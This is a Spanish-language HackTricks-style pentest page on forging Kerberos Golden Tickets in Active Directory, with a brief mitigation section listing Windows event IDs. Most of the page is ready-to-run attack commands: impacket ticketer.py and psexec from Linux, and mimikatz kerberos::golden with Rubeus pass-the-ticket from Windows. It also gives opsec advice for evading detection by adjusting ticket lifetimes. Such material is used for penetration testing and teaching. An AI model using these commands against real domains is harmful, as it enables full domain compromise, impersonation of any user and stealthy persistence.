## Golden Ticket

Se puede crear un **TGT válido como cualquier usuario** utilizando el hash NTLM de la cuenta AD krbtgt. La ventaja de forjar un TGT en lugar de un TGS es poder acceder a cualquier servicio (o máquina) en el dominio y al usuario suplantado. Además, las **credenciales** de **krbtgt** nunca se cambian automáticamente.

El hash NTLM de la cuenta **krbtgt** se puede obtener del proceso **lsass** o del archivo **NTDS.dit** de cualquier DC en el dominio. También es posible obtener ese NTLM a través de un ataque **DCsync**, que se puede realizar con el módulo [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) de Mimikatz o el ejemplo de impacket [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Por lo general, se requieren **privilegios de administrador de dominio o similares**, independientemente de la técnica utilizada.

También debe tenerse en cuenta que es posible y **preferible** (opsec) forjar tickets utilizando las claves Kerberos AES (AES128 y AES256).

{% code title="Desde Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Desde Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

Una vez que hayas inyectado el **Golden Ticket**, puedes acceder a los archivos compartidos **(C$)** y ejecutar servicios y WMI, por lo que podrías usar **psexec** o **wmiexec** para obtener una shell (parece que no puedes obtener una shell a través de winrm).

### Bypassing common detections

Las formas más frecuentes de detectar un Golden Ticket son **inspeccionando el tráfico de Kerberos** en la red. Por defecto, Mimikatz **firma el TGT por 10 años**, lo que destacará como anómalo en las solicitudes posteriores de TGS realizadas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desplazamiento de inicio, la duración y el máximo de renovaciones (todo en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Desafortunadamente, el tiempo de vida del TGT no se registra en los eventos 4769, por lo que no encontrará esta información en los registros de eventos de Windows. Sin embargo, lo que se puede correlacionar es **ver eventos 4769** _**sin**_ **un evento 4768 previo**. No es posible solicitar un TGS sin un TGT, y si no hay registro de que se haya emitido un TGT, podemos inferir que se falsificó sin conexión.

Para **evitar esta detección**, revise los tickets diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigación

* 4624: Inicio de sesión de cuenta
* 4672: Inicio de sesión de administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otros pequeños trucos que los defensores pueden hacer es **alertar sobre eventos 4769 para usuarios sensibles** como la cuenta predeterminada del administrador de dominio.

[**Más información sobre Golden Ticket en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
